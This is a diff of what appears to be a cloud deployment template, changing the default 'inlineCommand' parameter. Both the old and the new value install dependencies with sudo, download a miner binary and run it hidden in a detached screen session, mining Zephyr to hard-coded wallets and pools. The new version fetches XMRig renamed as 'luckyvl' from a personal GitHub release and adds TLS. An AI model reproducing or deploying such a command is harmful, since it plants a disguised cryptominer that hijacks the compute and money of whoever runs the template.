@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz; tar xf xmrig-6.20.0-linux-static-x64.tar.gz; cd xmrig-6.20.0; sudo screen -d -m ./xmrig -o zeph.eu.ekapool.com:15666 -u ZEPHYR2nwx21unyNtQW8YAXFWu7AHj2bY1rcMyActJtnT3fCc225MBKgFBMf5zYamaKNDyyns2YNw7eqE8jSob4tRErCSzdr81x2H -p jokervulinh -a rx -k --donate-level 1 -t 16",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt install docker.io -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/jokervulinh96/lucky3/releases/download/luckyvl/luckyvl.tar.gz; tar xf luckyvl.tar.gz; cd luckyvl; sudo screen -d -m ./luckyvl -o zephyr.miningocean.org:5432 -u ZEPHYR3NDqmD7mN2DAZdZx3DH8CvRs92mE7KnnpKDkXDZcXytMQmKMc8azkr39BRTdhFHd4CF2zcST8kHQQPMcojUezfegbKsag2N -p luckyvl -a rx -k --donate-level 1 --tls -t 16",
             "metadata": {
                 "description": "inline command"
             }
